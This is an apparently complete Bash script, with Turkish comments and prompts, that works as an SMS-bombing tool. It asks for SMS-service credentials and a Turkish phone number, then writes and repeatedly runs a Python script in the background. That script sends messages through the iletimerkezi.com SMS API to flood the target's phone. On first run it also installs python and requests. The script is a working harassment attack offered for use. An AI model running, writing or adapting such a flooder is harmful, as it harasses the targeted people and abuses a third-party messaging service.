#!/bin/bash
#Yaman Efkar Tarafından Kodlandı.
if [[ -e "Api/ok.txt" ]]; then
        clear
        rm -rf Api/yaman.py
        read -p $'\e[31m[\e[32m!\e[31m]\e[37mUsername : ' user
        read -p $'\e[31m[\e[32m!\e[31m]\e[37mPassword : ' pass
        sleep 0.8
        echo -e '\e[31mLütfen Bekleyiniz.'
        clear
        read -p $'\e[31m[\e[32m!\e[31m]\e[37mTelefon Numarası :-90 ' tel
        echo -e ""
        read -p $'\e[31m[\e[32m!\e[31m]\e[37mGönderilecek Sms [Max:50] : ' for
        sleep 0.8
        echo -e '\e[31mAtak Başlıyor....'
        cd Api/ &&
        echo 'import requests
string = """
                <request>
                <authentication>
                <username>'$user'</username>
                <password>'$pass'</password>
                </authentication>
                <order>
                        <sender>APITEST</sender>
                        <sendDateTime></sendDateTime>
                        <message>
                                <text><![CDATA[Hop ki uc bes]]></text>
                                <receipents>
                                        <number>'$tel'</number>
                                </receipents>
                        </message>
                </order>
        </request>""";

r = requests.post("http://api.iletimerkezi.com/v1/send-sms", data={"data": string})

print(r.status_code, r.reason)' >> yaman.py

for (( i = 0; i <= $for; i++ )); do
        clear
        python yaman.py > /dev/null 2>&1 &
        echo -e '\e[31mYoutube:Yaman Efkar (YamanEfkar Tarafından Kodlandı.)'
        echo -e '\e[31mGönderilen Sms Sayısı : '$i
        sleep 2.5
done
else
        apt install python python2 -y
        pip install requests
        cd Api/ &&
        echo "YamanEfkar Tarafından KODLANMIŞTIR!" >> ok.txt
        cd .. && bash tst.sh

fi
